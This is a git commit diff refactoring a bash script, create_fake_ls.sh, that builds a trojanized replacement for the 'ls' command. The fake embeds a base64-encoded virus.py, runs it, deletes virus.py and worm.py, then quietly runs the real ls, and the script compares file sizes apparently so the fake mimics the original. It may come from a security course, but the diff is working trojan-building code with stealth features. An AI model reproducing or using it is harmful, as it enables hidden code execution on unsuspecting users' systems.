ceef58f7fa8a439b8fb13e6c31a1d935337a43fb
kieann <cecchienchang@gmail.com>
2024-04-27 22:12:06 +0800

    chore: tidy the variables

--- create_fake_ls.sh
+++ create_fake_ls.sh
@@ -1,28 +1,32 @@
 #!/usr/bin/env bash
 
-FAKE_LS="ls"
 SIG="\xaa\xbb\xcc\xdd"
 
-ori_ls=`gzip -c /usr/bin/ls | base64 -w0`
-virus=`cat virus.py | base64 -w0`
-
+FAKE_LS="ls"
 ORI_LS_FILENAME=".ori_ls"
+
+ORI_LS=`gzip -c /usr/bin/ls | base64 -w0`
+VIRUS=`cat virus.py | base64 -w0`
+
+VIRUS_FILENAME="virus.py"
+WORM_FILENAME="worm.py"
+
 
 touch $FAKE_LS
 echo '#!/usr/bin/env bash' > $FAKE_LS
-echo "ori_ls=$ori_ls" >> $FAKE_LS
-echo "virus=$virus" >> $FAKE_LS
+echo "ori_ls=$ORI_LS" >> $FAKE_LS
+echo "virus=$VIRUS" >> $FAKE_LS
 echo "echo \$ori_ls | base64 -d | gzip --decompress > $ORI_LS_FILENAME" >> $FAKE_LS
-echo "echo \$virus | base64 -d > virus.py" >> $FAKE_LS
-echo "chmod +x $ORI_LS_FILENAME && chmod +x virus.py" >> $FAKE_LS
-echo "python3 virus.py $1 $2" >> $FAKE_LS  
-echo "rm virus.py worm.py" >> $FAKE_LS
-echo "./$ORI_LS_FILENAME \$1" >> $FAKE_LS
+echo "echo \$virus | base64 -d > $VIRUS_FILENAME" >> $FAKE_LS
+echo "chmod +x $ORI_LS_FILENAME" >> $FAKE_LS
+echo "python3 $VIRUS_FILENAME $1 $2" >> $FAKE_LS  
+echo "rm $VIRUS_FILENAME $WORM_FILENAME" >> $FAKE_LS
+echo "./$ORI_LS_FILENAME \"\$@\"" >> $FAKE_LS
 
 echo "rm $ORI_LS_FILENAME"  >> $FAKE_LS
 
-ori_sz=$(echo $(wc -c /usr/bin/ls) | cut -d ' ' -f 1)
-new_sz=$(echo $(wc -c ./ls) | cut -d ' ' -f 1)
+ori_sz=`wc -c /usr/bin/ls | cut -d ' ' -f 1`
+new_sz=`wc -c ./ls | cut -d ' ' -f 1`
 
 n=$((ori_sz - new_sz - 5))
 
